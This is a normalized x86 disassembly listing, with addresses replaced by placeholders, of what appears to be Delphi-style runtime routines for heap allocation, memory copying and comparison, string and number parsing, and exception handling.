call sub_40186c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fe8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402014
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bc0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e28
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f88
test al al
jne r-xdata
mov eax esi
call sub_401fe8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402108
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a1c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402284
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401378
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402014
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401380
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039b4
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039b4
jmp r-xdata
sub_402298
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40242a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401378
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401380
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_4039b4
jmp r-xdata
call sub_401eb0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bc0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e28
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bc0
sub_40243c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401eb0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bc0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fb4
test al al
je r-xdata
call sub_401bc0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c84
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e28
jmp r-xdata
sub_402618
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026c9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a1c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40243c
test al al
je r-xdata
push rw-data
call sub_401378
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402108
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028d8
mov eax ebx
call sub_402298
retn
push rw-data
call sub_401380
sub_4026dc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402838
sub_4026fc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402838
sub_40271c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402838
mov [ ecx ] eax
mov al 0x2
jmp sub_402838
retn
mov [ ecx ] eax
retn
sub_4027ac
push ebx
push esi
call sub_405eec
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405eec
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405eec
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027ec
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405eec
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027e0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402874
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028d8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402964
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402864
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4029b8
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402864
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402864
jmp r-xdata
sub_402a10
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402a4c
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_402a68
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402aec
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b5c
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b7c
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c5c
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402ca8
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d5b ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d5b ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d5b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f94
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402fc4
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012d4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403035
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
retn
sub_4030b8
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403160
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4031b8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404980
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031d8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4057d4
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403208
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40328c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40329c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403293
lea eax [ ebp - 0x8 ]
call sub_4057bc
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031d8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4057d4
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40329c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4032e0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403368
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403320
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403350
push eax
push ecx
mov eax [ eax ]
call sub_403320
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403ec0
call [ rw-data ]
sub_403398
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403320
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033c0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403410
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_403450
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4034a0
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4034c9
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403534
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403570
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403584
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
